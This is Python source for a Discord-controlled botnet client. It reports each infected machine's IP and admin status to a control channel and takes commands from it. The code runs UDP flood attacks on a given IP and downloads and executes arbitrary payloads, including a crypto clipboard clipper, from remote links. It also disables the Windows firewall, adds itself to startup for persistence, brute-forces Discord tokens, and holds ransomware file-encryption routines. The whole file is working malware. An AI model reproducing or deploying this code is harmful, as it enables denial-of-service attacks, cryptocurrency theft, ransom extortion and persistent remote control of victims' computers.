import ctypes
import os
import ssl
import discord
import asyncio
import base64
import asyncio
import urllib
import subprocess

# Other modules
from tokens import *
from threading import *
from tkinter import *
from ctypes import *
from time import *
from urllib.request import urlopen
from discord.ext import commands

# Ransomware imports
from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from discord_components import *
from discord.ext import commands
from tkinter import *
from random import randint
from ctypes import *

global appdata
global temp
global bots_name
bots_name = os.getlogin()
digits = randint(1111,9999)
appdata = os.getenv('APPDATA')
temp = os.getenv('temp')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Availaible commands are :
--> !pingsingle = Ping a single bot to see if their online / Syntax = "!pingsingle BOT_NAME"
--> !pingall = Ping all bots to see if their online / Syntax = "!pingall"
--> !selfdestructsingle = Remove all traces of the botnet / Syntax = "!selfdestructsingle BOT_NAME"
--> !selfdestructall = Remove all traces of the botnet from all bots / Syntax = "!selfdestructall"
--> !sysinfo = Grab system information for all bots / Syntax = "!sysinfo"
--> !disablefirewall = Disable all bots firewalls / Syntax = "!disablefirewall"
--> !startupsingle = Add botnet payload to startup for single bot / Syntax = "!startupsingle BOT_NAME"
--> !startupall = Add botnet payload to startup for all bots / Syntax = "!startupall"
--> !updatebots = Stop old version and start running new version / Syntax = "!updatebots https://cdn.discordapp.com/attachments/5475745543535345/945465325514355482/BotNet_Payload.exe"
--> !infectclipboard = Execute crypto clipper onto all bots / Syntax = "!infectclipboard https://cdn.discordapp.com/attachments/5475745543535345/945465325514355482/Clipboard_Infector.exe"
--> !stopinfectclipboard = Stops crypto clipper / Syntax = "!stopinfectclipboard"
--> !upload = Upload and execute any exe to all bots / Syntax = "!upload https://cdn.discordapp.com/attachments/5475745543535345/945465325514355482/Malware.exe"
--> !nitrogen = Generate nitro codes | min: 1000 max: 9999 / Syntax = "!nitrogen 5000 https://cdn.discordapp.com/attachments/5475745543535345/945465325514355482/Nitro_Checker.exe"
--> !attack = Attack a IP for certin amount of time/ Syntax = "!attack 00:00:05 999 111.111.111.111" (will attack IP 111.111.111.111 or 5 seconds with 999 threads)
"""



def password(passwd):
    
    password = passwd.encode() 
    salt = b'salt_' 
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k

def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass

def download_decrypter():
    NAME = os.getlogin()
    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
    f = urlopen(req)
    filecontent = f.read()
    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
        f.write(filecontent)
    f.close()

async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 1
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    try:
        channel_name = "botnet-clients"
        channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
        channel = client.get_channel(channel_.id)
    except:
        channel_name = "botnet-clients"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
        channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
        channel = client.get_channel(channel_.id)

    channel_name = f"botnet-clients"
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"**New Bot Infected!** \n> IP: **||{ip}||** Bots Name: **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Dev | cookiesservices.xyz")
    await client.change_presence(status=discord.Status.online, activity=game)

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)

        if message.content == "!help":
            import os
            temp = (os.getenv('TEMP'))
            f5 = open(temp + r"\\helpmenu.txt", 'a')
            f5.write(str(helpmenu))
            f5.close()
            file = discord.File(temp + r"\\helpmenu.txt", filename="helpmenu.txt")
            await message.channel.send("Command executed", file=file)
            os.remove(temp + r"\\helpmenu.txt")

########################################################################################################################################################################################################################## 
#! Kill inactive sessions

        # if message.content.startswith("!Kill"):
        #     try:
        #         if message.content[6:] == "all":
        #             for y in range(len(total)): 
        #                 if "session" in total[y]:
        #                     channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
        #                     await channel_to_delete.delete()
        #                 else:
        #                     pass
        #         else:
        #             channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
        #             await channel_to_delete.delete()
        #             await message.channel.send(f"{message.content[6:]} killed.")
        #     except:
        #         await message.channel.send(f"{message.content[6:]} is invalid, please enter a valid session name or all")

########################################################################################################################################################################################################################## 
#! ddos / all bots

        if message.content.startswith("!attack"):
            import socket, random, threading, time

            time_to_attack = message.content[8:16]
            threadss = message.content[17:20]
            user_ip = message.content[21:]

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            threads = []

            # hh:mm:ss -> seconds converter 
            def get_seconds(time_to_attack):
                hh, mm, ss = time_to_attack.split(':')
                return int(hh) * 3600 + int(mm) * 60 + int(ss)

            
            seconds_to_attack = get_seconds(time_to_attack) # Convert time to attack -> seconds
            global end
            end = time.time() + seconds_to_attack

            def Attack(user_ip, end):
                ip = user_ip
                port = 80
                while time.time() < end:
                    sock.sendto(bytes, (ip,port))
                    port = port + 1
                    if port == 65534:
                        port = 1

            try:
                thread_ammount = int(threadss)
            except:
                thread_ammount = 1
            finally:
                await message.channel.send(f"**{bots_name}** is attacking IP: ||{user_ip}|| for ``{seconds_to_attack}`` seconds with {thread_ammount} threads")

                if thread_ammount > 999:
                    await message.channel.send(f"Please use under 1000 threads!")
                elif thread_ammount < 101:
                    await message.channel.send(f"Please use over 100 threads!")
                else:
                    for i in range(thread_ammount):
                        t = threading.Thread(target=Attack, args=(user_ip, end,  ))
                        t.daemon = True
                        threads.append(t)

                    for i in range(thread_ammount):
                        threads[i].start()

                    for i in range(thread_ammount):
                        threads[i].join()

########################################################################################################################################################################################################################## 
#! Check single bots online status

        if message.content.startswith("!pingsingle"):
            bot_name = message.content[12:]
            if bot_name == bots_name:
                await message.channel.send(f"Pong!")
            else:
                await message.channel.send("Invalid bot name or bot offline!")

########################################################################################################################################################################################################################## 
#! Check all bots online status

        if message.content.startswith("!pingall"):
            await message.channel.send(f"**{bots_name}** is online!")

########################################################################################################################################################################################################################## 
#! Display the bots system info

        if message.content.startswith("!sysinfo"):
            import platform
            jak = str(platform.uname())
            info = jak[12:]
            await message.channel.send(f"**{bots_name}** System Infomation: ```{info}```")

########################################################################################################################################################################################################################## 
#! Nitro generator and checker

        if message.content.startswith("!nitrogen"):
            import random, string, requests, os

            codes_amount = int(message.content[10:14])
            nitro_checker_link = message.content[14:]

            if codes_amount > 9999:
                    await message.channel.send(f"Please use under 10000 codes!")
            elif codes_amount < 1000:
                    await message.channel.send(f"Please use over 1000 codes!")
            else:
                temp = (os.getenv("temp"))
                codes_half = codes_amount / 2

                await message.channel.send(f"Generating nitro codes to then check")
                #? Gen codes to txt file
                try:
                    if os.path.isdir(temp + '\\$~cache'):
                        pass
                    else:
                        os.mkdir(temp + '\\$~cache')

                    codes_file = temp + '\\$~cache\\Codes.txt'
                    if os.path.isfile(codes_file):
                        os.remove(codes_file)

                    value = 1
                    while value <= codes_amount:
                        code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
                        f = open(codes_file, "a+")
                        f.write(f'{code}\n')
                        f.close()
                        value += 1
                        if codes_amount > 4999:
                            if value == codes_half:
                                await message.channel.send(f"Generated half of the codes")
                except Exception as e:
                    await message.channel.send(f"Error! ```{e}```")

                await message.channel.send("Downloading checker, please wait. . .")

                try:
                    #? Download Checker
                    url = nitro_checker_link
                    r = requests.get(f"{url}")
                    with open(f'{temp}\\$~cache\\zChecker.exe', 'wb') as f:
                        f.write(r.content)
                    f.close()
                except Exception as e:
                    await message.channel.send(f"Error! \n```{e}```")
                
                #? Run checker
                os.startfile(f'{temp}\\$~cache\\zChecker.exe')
                await message.channel.send(f"Generated ``{codes_amount}`` nitro codes Starting to check them. . .")

########################################################################################################################################################################################################################## 
#! BTC Clipper

        if message.content.startswith("!infectclipboard"):
            await message.channel.send("Infecting clipboard, please wait. . .")
            import requests, os

            temp = (os.getenv('TEMP'))
            clipboard_injector_link = message.content[17:]

            try:
                #? Download Clipboard Injector
                file = f'{temp}\\$~cache\\zClipper.exe'
                r = requests.get(clipboard_injector_link)
                with open(file, 'wb') as f:
                    f.write(r.content)
                f.close()
            except Exception as e:
                    await message.channel.send(f"Error! \n```{e}```")

            os.startfile(file)
            await message.channel.send("Clipboard infected! (process running in background)")

########################################################################################################################################################################################################################## 
#! BTC Clipper Stop

        if message.content.startswith("!stopinfectclipboard"):
            import os, subprocess

            def process_exists(process_name):
                call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
                # use buildin check_output right away
                output = subprocess.check_output(call).decode()
                # check in last line for process name
                last_line = output.strip().split('\r\n')[-1]
                # because Fail message could be translated
                return last_line.lower().startswith(process_name.lower())

            file = 'zClipper.exe'
            if process_exists(file):
                os.system(f"taskkill /F /IM {file}")
                await message.channel.send("Stopped clipboard infection")
            else:
                await message.channel.send("No clipboard infection running")

########################################################################################################################################################################################################################## 
#! Disable Firewall

        if message.content.startswith("!disablefirewall"):
            import os, ctypes

            await message.channel.send("Disabling all bots firewalls, please wait. . .")
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                os.system("NetSh Advfirewall set allprofiles state off")
                await message.channel.send("Disabled all bots firewalls")
            else:
                await message.channel.send("Admin permissions needed")

########################################################################################################################################################################################################################## 
#! Update Bots

        if message.content.startswith("!updatebots"):
            import sys, requests, os

            cwd = os.getcwd()
            name = os.path.splitext(os.path.basename(__file__))[0]
            cwd2 = sys.argv[0]
            pid = os.getpid()
            temp = (os.getenv("temp"))
            url = message.content[12:]
            exe = ".exe"

            if exe in url:
                await message.channel.send("Updating please wait for new session! eta. 30-60 secs")

                try:
                    r = requests.get(f"{url}")
                    with open(f'{cwd}\\z{name}.exe', 'wb') as f:
                        f.write(r.content)
                    f.close()
                except Exception as e:
                    await message.channel.send(f"Error! \n```{e}```")

                #? Create batch file in temp folder to kill current PID and then delete it after that then run the new version 
                bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
                temp6 = temp + r"\\Update.bat"
                if os.path.isfile(temp6):
                    os.remove(temp6)
                with open(temp + r"\\Update.bat", 'w') as f6:
                    f6.write(bat)
                f6.close()
                os.system(r"start /min %temp%\\Update.bat")
            else:
                await message.channel.send("Make sure to use a exe file! ``(link ends in .exe)``")

########################################################################################################################################################################################################################## 
#! Upload any exe to all bots

        if message.content.startswith("!upload"):
            import requests, os

            temp = (os.getenv("temp"))
            url = message.content[8:]
            exe = ".exe"

            if exe in url:
                file = f'{temp}\\zupload.exe'
                await message.channel.send("Uploading and executing exe file to all bots! eta. 30-60 secs (depending on file size)")
                try:
                    r = requests.get(f"{url}")
                    with open(file, 'wb') as f:
                        f.write(r.content)
                    f.close()
                except Exception as e:
                    await message.channel.send(f"Error! \n```{e}```")
                os.startfile(file)
                await message.channel.send("Command executed, file running!")
            else:
                await message.channel.send("Make sure to use a exe file! ``(link ends in .exe)``")
            

########################################################################################################################################################################################################################## 
#! Add to Start-up Single

        if message.content.startswith("!startupsingle"):
            import os, sys, ctypes
            bot_name = message.content[15:]
            if bot_name == bots_name:
                await message.channel.send(f"Attempting to add to startup for bot named `{bots_name}`, please wait. . .")
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:  
                    path = sys.argv[0]
                    isexe=False
                    if (sys.argv[0].endswith("exe")):
                        isexe=True
                    if isexe:
                        os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
                    else:
                        os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                        e = r"""
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
        """.format(os.path.basename(sys.argv[0]))
                        with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                            f.write(e)
                            f.close()
                    await message.channel.send("Successfully added to startup")  
                else:
                    await message.channel.send("This command requires admin privileges")
            else:
                await message.channel.send("Invalid bot name or bot offline")

########################################################################################################################################################################################################################## 
#! Add to Start-up All

        if message.content.startswith("!startupall"):
            import os, sys, ctypes

            await message.channel.send("Attempting to add to startup for all bots, please wait. . .")
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                    e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                await message.channel.send("Successfully added to startup")  
            else:
                await message.channel.send("This command requires admin privileges")

########################################################################################################################################################################################################################## 
#! Self destruct for single bot

        if message.content.startswith("!selfdestructsingle"):
            import os, sys
            
            bot_name = message.content[20:]

            if bot_name == bots_name:
                pid = os.getpid()
                temp = (os.getenv("temp"))
                cwd2 = sys.argv[0]
                #? Kill running botnet and then delete the file then make the bat file delete itself
                data = f"Killed BotNet PID: {pid}\n\nRemoved BotNet file!"
                embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
                await message.channel.send(embed=embed)
                bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
                temp6 = temp + r"\\kill.bat"
                if os.path.isfile(temp6):
                    os.remove(temp6)
                f6 = open(temp + r"\\kill.bat", 'w')
                f6.write(bat)
                f6.close()
                os.system(r"start /min %temp%\\kill.bat")
            else:
                await message.channel.send("Invalid bot name or bot offline")

########################################################################################################################################################################################################################## 
#! Self destruct for all bots

        if message.content.startswith("!selfdestructall"):
            import os, sys

            pid = os.getpid()
            temp = (os.getenv("temp"))
            cwd2 = sys.argv[0]
            #? Kill running botnet and then delete the file then make the bat file delete itself
            data = f"Killed BotNet PID: {pid}\n\nRemoved BotNet file!"
            embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
            await message.channel.send(embed=embed)
            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
            temp6 = temp + r"\\kill.bat"
            if os.path.isfile(temp6):
                os.remove(temp6)
            f6 = open(temp + r"\\kill.bat", 'w')
            f6.write(bat)
            f6.close()
            os.system(r"start /min %temp%\\kill.bat")

########################################################################################################################################################################################################################## 
#! Token Brute Force

        if message.content.startswith("!tokenbruteforce"):
            import threading, random, requests, base64, string, os

            id = message.content[17:35]
            attempts = int(message.content[35:])
            valid = 0
            invalid = 0

            await message.channel.send(f"Attempting to brute force user id: ``{id}`` for {attempts} attempts!")
                
            id_to_token = base64.b64encode((id).encode("ascii"))
            id_to_token = str(id_to_token)[2:-1]

            async def bruteforce(valid, invalid):
                for i in range(attempts):
                    token = id_to_token + '.' + ('').join(
                        random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                                '').join(random.choices(string.ascii_letters + string.digits, k=25))

                    headers = {'Authorization': token}

                    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                    try:
                        if login.status_code == 200:
                            valid +=1
                            await message.channel.send(f"VALID TOKEN: ```{token}```")
                        else:
                            invalid +=1
                    finally:
                        shit = 12
                await message.channel.send(f"Finshed attempting to brute force token here are the results\n```VALID: {valid}\nINVALID: {invalid}```")

            await bruteforce(valid, invalid)




client.run(token)
